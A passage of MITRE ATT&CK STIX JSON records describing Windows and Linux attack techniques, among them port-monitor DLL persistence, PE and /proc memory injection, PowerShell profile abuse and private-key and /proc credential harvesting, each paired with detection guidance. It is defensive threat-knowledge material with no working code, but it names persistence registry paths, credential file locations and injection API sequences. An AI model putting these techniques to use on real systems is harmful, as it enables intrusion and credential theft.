    "{\"created\":\"2017-05-31T21:30:26.057Z\",\"external_references\":[{\"external_id\":\"T1013\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1013\"},{\"description\":\"Microsoft. (n.d.). AddMonitor function. Retrieved November 12, 2014.\",\"source_name\":\"AddMonitor\",\"url\":\"http://msdn.microsoft.com/en-us/library/dd183341\"},{\"description\":\"Bloxham, B. (n.d.). Getting Windows to Play with Itself &#91;PowerPoint slides&#93;. Retrieved November 12, 2014.\",\"source_name\":\"Bloxham\",\"url\":\"https://www.defcon.org/images/defcon-22/dc-22-presentations/Bloxham/DEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--1f47e2fd-fa77-4f2f-88ee-e85df308f125\",\"modified\":\"2020-01-24T19:47:55.183Z\",\"name\":\"Port Monitors\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T19:46:27.750Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup. (Citation: AddMonitor) This DLL can be located in <code>C:\\\\Windows\\\\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. (Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Print\\\\Monitors</code>. \\n\\nThe Registry key contains entries for the following:\\n\\n* Local Port\\n* Standard TCP/IP Port\\n* USB Monitor\\n* WSD Port\\n\\nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.\",\"external_references\":[{\"external_id\":\"T1547.010\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1547/010\"},{\"description\":\"Microsoft. (n.d.). AddMonitor function. Retrieved November 12, 2014.\",\"source_name\":\"AddMonitor\",\"url\":\"http://msdn.microsoft.com/en-us/library/dd183341\"},{\"description\":\"Bloxham, B. (n.d.). Getting Windows to Play with Itself &#91;PowerPoint slides&#93;. Retrieved November 12, 2014.\",\"source_name\":\"Bloxham\",\"url\":\"https://www.defcon.org/images/defcon-22/dc-22-presentations/Bloxham/DEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--43881e51-ac74-445b-b4c6-f9f9e9bf23fe\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-01-24T19:46:27.750Z\",\"name\":\"Port Monitors\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Stefan Kanthak\",\"Travis Smith, Tripwire\"],\"x_mitre_data_sources\":[\"File monitoring\",\"API monitoring\",\"DLL monitoring\",\"Windows Registry\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor process API calls to <code>AddMonitor</code>.(Citation: AddMonitor) Monitor DLLs that are loaded by spoolsv.exe for DLLs that are abnormal. New DLLs written to the System32 directory that do not correlate with known good software or patching may be suspicious. \\n\\nMonitor Registry writes to <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Print\\\\Monitors</code>. Run the Autoruns utility, which checks for this Registry key as a persistence mechanism (Citation: TechNet Autoruns)\",\"x_mitre_effective_permissions\":[\"SYSTEM\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"SYSTEM\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-14T01:27:31.344Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \\n\\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Endgame Process Injection July 2017) \\n\\nRunning code in the context of another process may allow access to the process\'s memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. \",\"external_references\":[{\"external_id\":\"T1055.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1055/002\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"}],\"id\":\"attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-06-20T22:19:58.813Z\",\"name\":\"Portable Executable Injection\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Application control\"],\"x_mitre_detection\":\"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Endgame Process Injection July 2017)\\n\\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:06.512Z\",\"external_references\":[{\"external_id\":\"T1086\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1086\"},{\"description\":\"Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016.\",\"source_name\":\"TechNet PowerShell\",\"url\":\"https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx\"},{\"description\":\"PowerSploit. (n.d.). Retrieved December 4, 2014.\",\"source_name\":\"Powersploit\",\"url\":\"https://github.com/mattifestation/PowerSploit\"},{\"description\":\"Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016.\",\"source_name\":\"Github PSAttack\",\"url\":\"https://github.com/jaredhaight/PSAttack\"},{\"description\":\"Warner, J.. (2015, January 6). Inexorable PowerShell – A Red Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018.\",\"source_name\":\"Sixdub PowerPick Jan 2016\",\"url\":\"http://www.sixdub.net/?p=367\"},{\"description\":\"Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018.\",\"source_name\":\"SilentBreak Offensive PS Dec 2015\",\"url\":\"https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/\"},{\"description\":\"Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019.\",\"source_name\":\"Microsoft PSfromCsharp APR 2014\",\"url\":\"https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/\"},{\"description\":\"Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.\",\"source_name\":\"Malware Archaeology PowerShell Cheat Sheet\",\"url\":\"http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf\"},{\"description\":\"Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016.\",\"source_name\":\"FireEye PowerShell Logging 2016\",\"url\":\"https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html\"}],\"id\":\"attack-pattern--f4882e23-8aa7-4b12-b28a-b349c12ee9e0\",\"modified\":\"2020-03-09T13:51:06.334Z\",\"name\":\"PowerShell\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-09T13:48:55.078Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\\n\\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\\n\\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\\n\\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell\'s underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)\",\"external_references\":[{\"external_id\":\"T1059.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1059/001\"},{\"description\":\"Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016.\",\"source_name\":\"TechNet PowerShell\",\"url\":\"https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx\"},{\"description\":\"Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016.\",\"source_name\":\"Github PSAttack\",\"url\":\"https://github.com/jaredhaight/PSAttack\"},{\"description\":\"Warner, J.. (2015, January 6). Inexorable PowerShell – A Red Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018.\",\"source_name\":\"Sixdub PowerPick Jan 2016\",\"url\":\"http://www.sixdub.net/?p=367\"},{\"description\":\"Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018.\",\"source_name\":\"SilentBreak Offensive PS Dec 2015\",\"url\":\"https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/\"},{\"description\":\"Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019.\",\"source_name\":\"Microsoft PSfromCsharp APR 2014\",\"url\":\"https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/\"},{\"description\":\"Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.\",\"source_name\":\"Malware Archaeology PowerShell Cheat Sheet\",\"url\":\"http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf\"},{\"description\":\"Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016.\",\"source_name\":\"FireEye PowerShell Logging 2016\",\"url\":\"https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html\"}],\"id\":\"attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-06-24T13:51:22.360Z\",\"name\":\"PowerShell\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Windows event logs\",\"Process monitoring\",\"Process command-line parameters\",\"PowerShell logs\",\"Loaded DLLs\",\"File monitoring\",\"DLL monitoring\"],\"x_mitre_detection\":\"If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\\n\\nMonitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)\\n\\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_remote_support\":true,\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-06-14T18:53:49.472Z\",\"external_references\":[{\"external_id\":\"T1504\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1504\"},{\"description\":\"Microsoft. (2017, November 29). About Profiles. Retrieved June 14, 2019.\",\"source_name\":\"Microsoft About Profiles\",\"url\":\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6\"},{\"description\":\"Faou, M. and Dumont R.. (2019, May 29). A dive into Turla PowerShell usage. Retrieved June 14, 2019.\",\"source_name\":\"ESET Turla PowerShell May 2019\",\"url\":\"https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/\"},{\"description\":\"DeRyke, A.. (2019, June 7). Lab Notes: Persistence and Privilege Elevation using the Powershell Profile. Retrieved July 8, 2019.\",\"source_name\":\"Wits End and Shady PowerShell Profiles\",\"url\":\"https://witsendandshady.blogspot.com/2019/06/lab-notes-persistence-and-privilege.html\"},{\"description\":\"Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.\",\"source_name\":\"Malware Archaeology PowerShell Cheat Sheet\",\"url\":\"http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf\"}],\"id\":\"attack-pattern--723e3a2b-ca0d-4daa-ada8-82ea35d3733a\",\"modified\":\"2020-01-24T15:11:53.430Z\",\"name\":\"PowerShell Profile\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T15:11:02.758Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.\\n\\n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) \\n\\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) \\n\\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)\",\"external_references\":[{\"external_id\":\"T1546.013\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546/013\"},{\"description\":\"Microsoft. (2017, November 29). About Profiles. Retrieved June 14, 2019.\",\"source_name\":\"Microsoft About Profiles\",\"url\":\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6\"},{\"description\":\"Faou, M. and Dumont R.. (2019, May 29). A dive into Turla PowerShell usage. Retrieved June 14, 2019.\",\"source_name\":\"ESET Turla PowerShell May 2019\",\"url\":\"https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/\"},{\"description\":\"DeRyke, A.. (2019, June 7). Lab Notes: Persistence and Privilege Elevation using the Powershell Profile. Retrieved July 8, 2019.\",\"source_name\":\"Wits End and Shady PowerShell Profiles\",\"url\":\"https://witsendandshady.blogspot.com/2019/06/lab-notes-persistence-and-privilege.html\"},{\"description\":\"Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.\",\"source_name\":\"Malware Archaeology PowerShell Cheat Sheet\",\"url\":\"http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf\"}],\"id\":\"attack-pattern--0f2c410d-d740-4ed9-abb1-b8f4a7faf6c3\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-24T21:31:31.082Z\",\"name\":\"PowerShell Profile\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Allen DeRyke, ICE\"],\"x_mitre_data_sources\":[\"PowerShell logs\",\"File monitoring\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Locations where <code>profile.ps1</code> can be stored should be monitored for new profiles or modifications. (Citation: Malware Archaeology PowerShell Cheat Sheet) Example profile locations include:\\n\\n* <code>$PsHome\\\\Profile.ps1</code>\\n* <code>$PsHome\\\\Microsoft.{HostProgram}_profile.ps1</code>\\n* <code>$Home\\\\My Documents\\\\PowerShell\\\\Profile.ps1</code>\\n* <code>$Home\\\\My Documents\\\\PowerShell\\\\Microsoft.{HostProgram}_profile.ps1</code>\\n\\nMonitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules, and/or execution of unknown programs.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-11-13T14:44:49.439Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)\\n\\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.\",\"external_references\":[{\"external_id\":\"T1542\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1542\"},{\"description\":\"Wikipedia. (n.d.). Booting. Retrieved November 13, 2019.\",\"source_name\":\"Wikipedia Booting\",\"url\":\"https://en.wikipedia.org/wiki/Booting\"},{\"description\":\"Pinola, M. (2014, December 14). 3 tools to check your hard drive\'s health and make sure it\'s not already dying on you. Retrieved October 2, 2018.\",\"source_name\":\"ITWorld Hard Disk Health Dec 2014\",\"url\":\"https://www.itworld.com/article/2853992/3-tools-to-check-your-hard-drives-health-and-make-sure-its-not-already-dying-on-you.html\"}],\"id\":\"attack-pattern--7f0ca133-88c4-40c6-a62f-b3083a7fbc2e\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-05-19T21:22:38.174Z\",\"name\":\"Pre-OS Boot\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"VBR\",\"MBR\",\"Component firmware\",\"Process monitoring\",\"Disk forensics\",\"EFI\",\"BIOS\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Host intrusion prevention systems\",\"File monitoring\"],\"x_mitre_detection\":\"Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes. Take snapshots of boot records and firmware and compare against known good images. Log changes to boot records, BIOS, and EFI, which can be performed by API calls, and compare against known good behavior and patching.\\n\\nDisk check, forensic utilities, and data from device drivers (i.e. processes and API calls) may reveal anomalies that warrant deeper investigation. (Citation: ITWorld Hard Disk Health Dec 2014)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1145\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1145\"},{\"description\":\"Wikipedia. (2017, June 29). Public-key cryptography. Retrieved July 5, 2017.\",\"source_name\":\"Wikipedia Public Key Crypto\",\"url\":\"https://en.wikipedia.org/wiki/Public-key_cryptography\"},{\"description\":\"Kaspersky Labs. (2014, February 11). Unveiling “Careto” - The Masked APT. Retrieved July 5, 2017.\",\"source_name\":\"Kaspersky Careto\",\"url\":\"https://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask_v1.0.pdf\"},{\"description\":\"Bar, T., Conant, S., Efraim, L. (2016, June 28). Prince of Persia – Game Over. Retrieved July 5, 2017.\",\"source_name\":\"Palo Alto Prince of Persia\",\"url\":\"https://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/\"}],\"id\":\"attack-pattern--56ff457d-5e39-492b-974c-dfd2b8603ffe\",\"modified\":\"2020-02-18T16:51:57.775Z\",\"name\":\"Private Keys\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-04T13:06:49.258Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \\n\\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.\\n\\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)\\n\\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.\",\"external_references\":[{\"external_id\":\"T1552.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1552/004\"},{\"description\":\"Wikipedia. (2017, June 29). Public-key cryptography. Retrieved July 5, 2017.\",\"source_name\":\"Wikipedia Public Key Crypto\",\"url\":\"https://en.wikipedia.org/wiki/Public-key_cryptography\"},{\"description\":\"Kaspersky Labs. (2014, February 11). Unveiling “Careto” - The Masked APT. Retrieved July 5, 2017.\",\"source_name\":\"Kaspersky Careto\",\"url\":\"https://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask_v1.0.pdf\"},{\"description\":\"Bar, T., Conant, S., Efraim, L. (2016, June 28). Prince of Persia – Game Over. Retrieved July 5, 2017.\",\"source_name\":\"Palo Alto Prince of Persia\",\"url\":\"https://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/\"}],\"id\":\"attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-29T21:36:36.613Z\",\"name\":\"Private Keys\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Itzik Kotler, SafeBreach\"],\"x_mitre_data_sources\":[\"File monitoring\"],\"x_mitre_detection\":\"Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T18:46:24.434Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may gather credentials from information stored in the Proc filesystem or <code>/proc</code>. The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively.\\n\\nThis functionality has been implemented in the MimiPenguin(Citation: MimiPenguin GitHub May 2017), an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.\",\"external_references\":[{\"external_id\":\"T1003.007\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1003/007\"},{\"description\":\"Gregal, H. (2017, May 12). MimiPenguin. Retrieved December 5, 2017.\",\"source_name\":\"MimiPenguin GitHub May 2017\",\"url\":\"https://github.com/huntergregal/mimipenguin\"}],\"id\":\"attack-pattern--3120b9fa-23b8-4500-ae73-09494f607b7d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-19T15:32:18.098Z\",\"name\":\"Proc Filesystem\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\"],\"x_mitre_detection\":\"To obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path <code>/proc/\\\\*/maps</code>, where the <code>\\\\*</code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"root\"],\"x_mitre_platforms\":[\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-14T01:34:10.588Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. \\n\\nProc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within <code>/proc/[pid]/maps</code> can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) \\n\\nOther techniques such as [LD_PRELOAD](https://attack.mitre.org/techniques/T1574/006) may be used to populate a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) \\n\\nRunning code in the context of another process may allow access to the process\'s memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process. 